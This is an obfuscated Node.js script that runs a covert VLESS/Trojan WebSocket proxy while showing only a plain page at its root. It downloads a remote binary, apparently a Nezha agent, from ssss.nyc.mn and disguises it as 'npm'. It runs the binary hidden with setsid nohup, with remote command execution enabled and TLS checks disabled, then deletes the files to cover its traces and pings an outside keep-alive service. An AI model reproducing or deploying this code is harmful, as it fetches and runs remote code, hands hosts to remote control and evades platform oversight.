const _0x4a4448=_0x83a7;(function(_0x4b0c5f,_0x1be875){const _0x186b0b=_0x83a7,_0xa03f47=_0x4b0c5f();while(!![]){try{const _0x15dc91=-parseInt(_0x186b0b(0x1f4))/0x1*(parseInt(_0x186b0b(0x219))/0x2)+parseInt(_0x186b0b(0x1e0))/0x3*(-parseInt(_0x186b0b(0x1f6))/0x4)+parseInt(_0x186b0b(0x1de))/0x5*(-parseInt(_0x186b0b(0x21f))/0x6)+-parseInt(_0x186b0b(0x1c0))/0x7+parseInt(_0x186b0b(0x1db))/0x8+parseInt(_0x186b0b(0x1f7))/0x9+parseInt(_0x186b0b(0x209))/0xa;if(_0x15dc91===_0x1be875)break;else _0xa03f47['push'](_0xa03f47['shift']());}catch(_0x2cb84e){_0xa03f47['push'](_0xa03f47['shift']());}}}(_0x3b03,0x59d26));const os=require('os'),http=require(_0x4a4448(0x211)),fs=require('fs'),axios=require(_0x4a4448(0x1df)),net=require('net'),path=require('path'),crypto=require(_0x4a4448(0x1ed)),{Buffer}=require(_0x4a4448(0x1c8)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x4a4448(0x1e9),NEZHA_SERVER=process[_0x4a4448(0x1ff)][_0x4a4448(0x1c5)]||'',NEZHA_PORT=process[_0x4a4448(0x1ff)][_0x4a4448(0x1f1)]||'',NEZHA_KEY=process[_0x4a4448(0x1ff)]['NEZHA_KEY']||'',DOMAIN=process[_0x4a4448(0x1ff)]['DOMAIN']||'hf-mirror.edisonhu.de5.net',AUTO_ACCESS=process[_0x4a4448(0x1ff)][_0x4a4448(0x21c)]||!![],WSPATH=process[_0x4a4448(0x1ff)][_0x4a4448(0x1f5)]||UUID[_0x4a4448(0x205)](0x0,0x8),SUB_PATH=process[_0x4a4448(0x1ff)]['SUB_PATH']||_0x4a4448(0x1ef),NAME=process[_0x4a4448(0x1ff)][_0x4a4448(0x1ee)]||_0x4a4448(0x210),PORT=process[_0x4a4448(0x1ff)][_0x4a4448(0x203)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1c7441=_0x4a4448;try{const _0x1731fb=await axios['get'](_0x1c7441(0x20b)),_0x18d437=_0x1731fb[_0x1c7441(0x1d7)];ISP=(_0x18d437['country']+'-'+_0x18d437['asOrganization'])[_0x1c7441(0x225)](/ /g,'_');}catch(_0x585bf3){ISP=_0x1c7441(0x1ca);}};GetISP();const httpServer=http['createServer']((_0x4f05ea,_0x2deaf3)=>{const _0x4ac494=_0x4a4448;if(_0x4f05ea[_0x4ac494(0x1f2)]==='/'){const _0x444256=path['join'](__dirname,_0x4ac494(0x223));fs[_0x4ac494(0x204)](_0x444256,_0x4ac494(0x22d),(_0xb45078,_0x3d6c1f)=>{const _0x52f885=_0x4ac494;if(_0xb45078){_0x2deaf3[_0x52f885(0x218)](0xc8,{'Content-Type':_0x52f885(0x1c2)}),_0x2deaf3[_0x52f885(0x1d1)]('Hello\x20world!');return;}_0x2deaf3[_0x52f885(0x218)](0xc8,{'Content-Type':_0x52f885(0x1c2)}),_0x2deaf3[_0x52f885(0x1d1)](_0x3d6c1f);});return;}else{if(_0x4f05ea[_0x4ac494(0x1f2)]==='/'+SUB_PATH){const _0x43cc41=_0x4ac494(0x1fe)+UUID+'@'+DOMAIN+_0x4ac494(0x21e)+DOMAIN+_0x4ac494(0x220)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x11864=_0x4ac494(0x214)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x4ac494(0x220)+DOMAIN+_0x4ac494(0x1bb)+WSPATH+'#'+NAME+'-'+ISP,_0x4d3ce5=_0x43cc41+'\x0a'+_0x11864,_0x197813=Buffer['from'](_0x4d3ce5)[_0x4ac494(0x1eb)]('base64');_0x2deaf3['writeHead'](0xc8,{'Content-Type':_0x4ac494(0x1fa)}),_0x2deaf3[_0x4ac494(0x1d1)](_0x197813+'\x0a');}else _0x2deaf3['writeHead'](0x194,{'Content-Type':_0x4ac494(0x1fa)}),_0x2deaf3['end'](_0x4ac494(0x206));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x4a4448(0x225)](/-/g,''),DNS_SERVERS=[_0x4a4448(0x233),_0x4a4448(0x1c3)];function _0x83a7(_0x3dea81,_0x35e06a){_0x3dea81=_0x3dea81-0x1bb;const _0x3b0341=_0x3b03();let _0x83a72d=_0x3b0341[_0x3dea81];return _0x83a72d;}function resolveHost(_0x2edbc1){return new Promise((_0x3af6e7,_0x5481b9)=>{const _0x10ce67=_0x83a7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x10ce67(0x230)](_0x2edbc1)){_0x3af6e7(_0x2edbc1);return;}let _0x3c98a2=0x0;function _0x4d16c8(){const _0x1a6a06=_0x10ce67;if(_0x3c98a2>=DNS_SERVERS[_0x1a6a06(0x1d4)]){_0x5481b9(new Error('Failed\x20to\x20resolve\x20'+_0x2edbc1+_0x1a6a06(0x20d)));return;}const _0x3cb976=DNS_SERVERS[_0x3c98a2];_0x3c98a2++;const _0xa41113=_0x1a6a06(0x1e3)+encodeURIComponent(_0x2edbc1)+_0x1a6a06(0x228);axios[_0x1a6a06(0x200)](_0xa41113,{'timeout':0x1388,'headers':{'Accept':_0x1a6a06(0x217)}})[_0x1a6a06(0x1d0)](_0x552d36=>{const _0x4f716b=_0x1a6a06,_0x392d40=_0x552d36[_0x4f716b(0x1d7)];if(_0x392d40[_0x4f716b(0x1f3)]===0x0&&_0x392d40[_0x4f716b(0x22f)]&&_0x392d40['Answer'][_0x4f716b(0x1d4)]>0x0){const _0x512328=_0x392d40[_0x4f716b(0x22f)][_0x4f716b(0x1cb)](_0x422954=>_0x422954['type']===0x1);if(_0x512328){_0x3af6e7(_0x512328[_0x4f716b(0x1d7)]);return;}}_0x4d16c8();})[_0x1a6a06(0x1d3)](_0x48149d=>{_0x4d16c8();});}_0x4d16c8();});}function handleVlessConnection(_0x13bad3,_0x1841b1){const _0x11cae4=_0x4a4448,[_0x245c8f]=_0x1841b1,_0x4fe4a7=_0x1841b1[_0x11cae4(0x205)](0x1,0x11);if(!_0x4fe4a7[_0x11cae4(0x1e4)]((_0x2b76c7,_0x3279bc)=>_0x2b76c7==parseInt(uuid['substr'](_0x3279bc*0x2,0x2),0x10)))return![];let _0x289afd=_0x1841b1[_0x11cae4(0x205)](0x11,0x12)[_0x11cae4(0x1bc)]()+0x13;const _0x521e75=_0x1841b1[_0x11cae4(0x205)](_0x289afd,_0x289afd+=0x2)['readUInt16BE'](0x0),_0x49906e=_0x1841b1[_0x11cae4(0x205)](_0x289afd,_0x289afd+=0x1)[_0x11cae4(0x1bc)](),_0x395a4d=_0x49906e==0x1?_0x1841b1['slice'](_0x289afd,_0x289afd+=0x4)['join']('.'):_0x49906e==0x2?new TextDecoder()[_0x11cae4(0x21d)](_0x1841b1['slice'](_0x289afd+0x1,_0x289afd+=0x1+_0x1841b1['slice'](_0x289afd,_0x289afd+0x1)['readUInt8']())):_0x49906e==0x3?_0x1841b1[_0x11cae4(0x205)](_0x289afd,_0x289afd+=0x10)[_0x11cae4(0x20c)]((_0x2770a9,_0x20c52d,_0xcf8426,_0x53e8cb)=>_0xcf8426%0x2?_0x2770a9[_0x11cae4(0x22b)](_0x53e8cb[_0x11cae4(0x205)](_0xcf8426-0x1,_0xcf8426+0x1)):_0x2770a9,[])[_0x11cae4(0x1c4)](_0x1aa45c=>_0x1aa45c['readUInt16BE'](0x0)['toString'](0x10))[_0x11cae4(0x1dd)](':'):'';_0x13bad3[_0x11cae4(0x226)](new Uint8Array([_0x245c8f,0x0]));const _0x4ca68c=createWebSocketStream(_0x13bad3);return resolveHost(_0x395a4d)['then'](_0x9a9ed=>{const _0x41ae68=_0x11cae4;net[_0x41ae68(0x1ce)]({'host':_0x9a9ed,'port':_0x521e75},function(){const _0x41bcc1=_0x41ae68;this['write'](_0x1841b1['slice'](_0x289afd)),_0x4ca68c['on'](_0x41bcc1(0x232),()=>{})[_0x41bcc1(0x1e2)](this)['on'](_0x41bcc1(0x232),()=>{})[_0x41bcc1(0x1e2)](_0x4ca68c);})['on'](_0x41ae68(0x232),()=>{});})[_0x11cae4(0x1d3)](_0x1d357b=>{const _0x54aebd=_0x11cae4;net[_0x54aebd(0x1ce)]({'host':_0x395a4d,'port':_0x521e75},function(){const _0x5867c9=_0x54aebd;this[_0x5867c9(0x231)](_0x1841b1[_0x5867c9(0x205)](_0x289afd)),_0x4ca68c['on'](_0x5867c9(0x232),()=>{})['pipe'](this)['on'](_0x5867c9(0x232),()=>{})[_0x5867c9(0x1e2)](_0x4ca68c);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x8f6e6,_0xf1e37f){const _0x5d2435=_0x4a4448;try{if(_0xf1e37f[_0x5d2435(0x1d4)]<0x3a)return![];const _0x2ffc2c=_0xf1e37f[_0x5d2435(0x205)](0x0,0x38)[_0x5d2435(0x1eb)](),_0xf15d88=[UUID];let _0x3ce066=null;for(const _0x1b1bc9 of _0xf15d88){const _0x4eaa0c=crypto['createHash']('sha224')[_0x5d2435(0x1dc)](_0x1b1bc9)[_0x5d2435(0x213)](_0x5d2435(0x1d9));if(_0x4eaa0c===_0x2ffc2c){_0x3ce066=_0x1b1bc9;break;}}if(!_0x3ce066)return![];let _0x98fe25=0x38;_0xf1e37f[_0x98fe25]===0xd&&_0xf1e37f[_0x98fe25+0x1]===0xa&&(_0x98fe25+=0x2);const _0x1bc2e8=_0xf1e37f[_0x98fe25];if(_0x1bc2e8!==0x1)return![];_0x98fe25+=0x1;const _0x40b955=_0xf1e37f[_0x98fe25];_0x98fe25+=0x1;let _0x3b1080,_0x20fb88;if(_0x40b955===0x1)_0x3b1080=_0xf1e37f['slice'](_0x98fe25,_0x98fe25+0x4)['join']('.'),_0x98fe25+=0x4;else{if(_0x40b955===0x3){const _0x5e6965=_0xf1e37f[_0x98fe25];_0x98fe25+=0x1,_0x3b1080=_0xf1e37f['slice'](_0x98fe25,_0x98fe25+_0x5e6965)[_0x5d2435(0x1eb)](),_0x98fe25+=_0x5e6965;}else{if(_0x40b955===0x4)_0x3b1080=_0xf1e37f[_0x5d2435(0x205)](_0x98fe25,_0x98fe25+0x10)[_0x5d2435(0x20c)]((_0xb750aa,_0x5d42cb,_0x3e6c14,_0x3787a1)=>_0x3e6c14%0x2?_0xb750aa[_0x5d2435(0x22b)](_0x3787a1['slice'](_0x3e6c14-0x1,_0x3e6c14+0x1)):_0xb750aa,[])[_0x5d2435(0x1c4)](_0x35e450=>_0x35e450[_0x5d2435(0x208)](0x0)[_0x5d2435(0x1eb)](0x10))[_0x5d2435(0x1dd)](':'),_0x98fe25+=0x10;else return![];}}_0x20fb88=_0xf1e37f[_0x5d2435(0x208)](_0x98fe25),_0x98fe25+=0x2;_0x98fe25<_0xf1e37f[_0x5d2435(0x1d4)]&&_0xf1e37f[_0x98fe25]===0xd&&_0xf1e37f[_0x98fe25+0x1]===0xa&&(_0x98fe25+=0x2);const _0x2a859a=createWebSocketStream(_0x8f6e6);return resolveHost(_0x3b1080)['then'](_0x2a94a6=>{const _0x1fd7be=_0x5d2435;net[_0x1fd7be(0x1ce)]({'host':_0x2a94a6,'port':_0x20fb88},function(){const _0x548cef=_0x1fd7be;_0x98fe25<_0xf1e37f[_0x548cef(0x1d4)]&&this['write'](_0xf1e37f[_0x548cef(0x205)](_0x98fe25)),_0x2a859a['on'](_0x548cef(0x232),()=>{})[_0x548cef(0x1e2)](this)['on'](_0x548cef(0x232),()=>{})[_0x548cef(0x1e2)](_0x2a859a);})['on'](_0x1fd7be(0x232),()=>{});})[_0x5d2435(0x1d3)](_0x387fa5=>{const _0x512d6d=_0x5d2435;net[_0x512d6d(0x1ce)]({'host':_0x3b1080,'port':_0x20fb88},function(){const _0x20dcf4=_0x512d6d;_0x98fe25<_0xf1e37f[_0x20dcf4(0x1d4)]&&this[_0x20dcf4(0x231)](_0xf1e37f[_0x20dcf4(0x205)](_0x98fe25)),_0x2a859a['on'](_0x20dcf4(0x232),()=>{})[_0x20dcf4(0x1e2)](this)['on'](_0x20dcf4(0x232),()=>{})[_0x20dcf4(0x1e2)](_0x2a859a);})['on']('error',()=>{});}),!![];}catch(_0x320127){return![];}}wss['on'](_0x4a4448(0x20e),(_0x3a54f2,_0x31fa19)=>{const _0x5b5c1e=_0x4a4448,_0x5def22=_0x31fa19[_0x5b5c1e(0x1f2)]||'';_0x3a54f2[_0x5b5c1e(0x1ec)]('message',_0x8866d=>{const _0x520f84=_0x5b5c1e;if(_0x8866d[_0x520f84(0x1d4)]>0x11&&_0x8866d[0x0]===0x0){const _0x5b9ee0=_0x8866d[_0x520f84(0x205)](0x1,0x11),_0x23a81f=_0x5b9ee0[_0x520f84(0x1e4)]((_0x59e9c8,_0x13f444)=>_0x59e9c8==parseInt(uuid[_0x520f84(0x227)](_0x13f444*0x2,0x2),0x10));if(_0x23a81f){!handleVlessConnection(_0x3a54f2,_0x8866d)&&_0x3a54f2['close']();return;}}!handleTrojanConnection(_0x3a54f2,_0x8866d)&&_0x3a54f2['close']();})['on'](_0x5b5c1e(0x232),()=>{});});function _0x3b03(){const _0x5057c4=['arch','toString','once','crypto','NAME','sub','2096','NEZHA_PORT','url','Status','94481EyvanB','WSPATH','2302972udCQfb','5308029piOUZm','https://arm64.ssss.nyc.mn/v1','split','text/plain','npm\x20is\x20already\x20running,\x20skip\x20running...','8443','utf-8','vless://','env','get','application/json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','PORT','readFile','slice','Not\x20Found\x0a','writeFileSync','readUInt16BE','12545680LJLxna','true','https://speed.cloudflare.com/meta','reduce','\x20with\x20all\x20DNS\x20servers','connection','stream','Hug','http','npm\x20is\x20running','digest','trojan://','log','client_secret:\x20','application/dns-json','writeHead','8jDnjSF','https://amd64.ssss.nyc.mn/v1','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','decode',':443?encryption=none&security=tls&sni=','6eAMTsW','&fp=chrome&type=ws&host=','setsid\x20nohup\x20./npm\x20-s\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','index.html','https://','replace','send','substr','&type=A','aarch64','--tls','concat','false','utf8','pop','Answer','test','write','error','8.8.4.4','&path=%2F','readUInt8','unlink','npm','Server\x20is\x20running\x20on\x20port\x20','3292506MmOcDd','\x20-p\x20','text/html','1.1.1.1','map','NEZHA_SERVER','443','post','buffer','includes','Unknown','find','2087','config.yaml','connect','2053','then','end','createWriteStream','catch','length','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','error:\x20','data','finish','hex','trim','3922632SxNctW','update','join','2713715TxHBOs','axios','3zLHNSb','npm\x20running\x20error:','pipe','https://dns.google/resolve?name=','every','arm64','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2083','npm\x20download\x20successfully','715abf30-2577-8d99-6d76-8d60cea59ab5'];_0x3b03=function(){return _0x5057c4;};return _0x3b03();}const getDownloadUrl=()=>{const _0xe4831f=_0x4a4448,_0x5a77d9=os[_0xe4831f(0x1ea)]();return _0x5a77d9==='arm'||_0x5a77d9===_0xe4831f(0x1e5)||_0x5a77d9===_0xe4831f(0x229)?!NEZHA_PORT?_0xe4831f(0x1f8):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0xe4831f(0x21a):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x18b3b6=_0x4a4448;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x58bdfd=getDownloadUrl(),_0x46ec8a=await axios({'method':_0x18b3b6(0x200),'url':_0x58bdfd,'responseType':_0x18b3b6(0x20f)}),_0x18d44f=fs[_0x18b3b6(0x1d2)](_0x18b3b6(0x1be));return _0x46ec8a['data'][_0x18b3b6(0x1e2)](_0x18d44f),new Promise((_0x524c50,_0x3c6a48)=>{const _0x4d2ce7=_0x18b3b6;_0x18d44f['on'](_0x4d2ce7(0x1d8),()=>{const _0x1c2f38=_0x4d2ce7;console[_0x1c2f38(0x215)](_0x1c2f38(0x1e8)),exec('chmod\x20+x\x20npm',_0x578be=>{if(_0x578be)_0x3c6a48(_0x578be);_0x524c50();});}),_0x18d44f['on'](_0x4d2ce7(0x232),_0x3c6a48);});}catch(_0xa4f7ea){throw _0xa4f7ea;}},runnz=async()=>{const _0x279a88=_0x4a4448;try{const _0x46473f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x279a88(0x1fd)});if(_0x46473f[_0x279a88(0x1da)]()!==''){console[_0x279a88(0x215)](_0x279a88(0x1fb));return;}}catch(_0x4cf4d4){}await downloadFile();let _0x1ad2da='',_0x2fcf64=[_0x279a88(0x1c6),_0x279a88(0x1fc),_0x279a88(0x1f0),_0x279a88(0x1cc),_0x279a88(0x1e7),_0x279a88(0x1cf)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5cb7a2=_0x2fcf64[_0x279a88(0x1c9)](NEZHA_PORT)?_0x279a88(0x22a):'';_0x1ad2da=_0x279a88(0x221)+NEZHA_SERVER+':'+NEZHA_PORT+_0x279a88(0x1c1)+NEZHA_KEY+'\x20'+_0x5cb7a2+_0x279a88(0x1e6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x179b1f=NEZHA_SERVER[_0x279a88(0x1c9)](':')?NEZHA_SERVER[_0x279a88(0x1f9)](':')[_0x279a88(0x22e)]():'',_0x5f2262=_0x2fcf64[_0x279a88(0x1c9)](_0x179b1f)?_0x279a88(0x20a):_0x279a88(0x22c),_0xef6800=_0x279a88(0x216)+NEZHA_KEY+_0x279a88(0x202)+NEZHA_SERVER+_0x279a88(0x1d5)+_0x5f2262+_0x279a88(0x222)+UUID;fs[_0x279a88(0x207)](_0x279a88(0x1cd),_0xef6800);}_0x1ad2da=_0x279a88(0x21b);}else{console[_0x279a88(0x215)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1ad2da,{'shell':'/bin/bash'},_0x5f46f1=>{const _0x145a7e=_0x279a88;if(_0x5f46f1)console[_0x145a7e(0x232)](_0x145a7e(0x1e1),_0x5f46f1);else console['log'](_0x145a7e(0x212));});}catch(_0x56fa3a){console['error'](_0x279a88(0x1d6)+_0x56fa3a);}};async function addAccessTask(){const _0x17e4c1=_0x4a4448;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2822ed=_0x17e4c1(0x224)+DOMAIN;try{const _0x89b279=await axios[_0x17e4c1(0x1c7)]('https://oooo.serv00.net/add-url',{'url':_0x2822ed},{'headers':{'Content-Type':_0x17e4c1(0x201)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x51a7f0){}}const delFiles=()=>{const _0x379ac5=_0x4a4448;fs[_0x379ac5(0x1bd)](_0x379ac5(0x1be),()=>{}),fs['unlink'](_0x379ac5(0x1cd),()=>{});};httpServer['listen'](PORT,()=>{const _0x542dec=_0x4a4448;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x542dec(0x215)](_0x542dec(0x1bf)+PORT);});
